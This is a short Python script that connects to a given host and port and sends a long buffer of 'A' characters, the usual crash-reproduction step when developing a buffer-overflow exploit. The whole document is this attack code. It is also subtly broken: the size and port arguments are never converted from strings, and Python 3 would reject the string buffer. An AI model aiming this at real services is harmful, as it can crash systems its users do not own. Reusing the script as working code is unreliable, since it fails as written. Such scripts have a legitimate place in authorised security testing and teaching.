import socket
import time
import sys

if len(sys.argv) < 4:
    print("usage: \"python reproduce.py [host] [port] [size]\"")
    exit(0)

host = sys.argv[1]
port = sys.argv[2]
size = sys.argv[3]

inputBuffer = "A" * size

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("sending buffer")
s.send(inputBuffer)
s.recv(1024)
s.close()
     



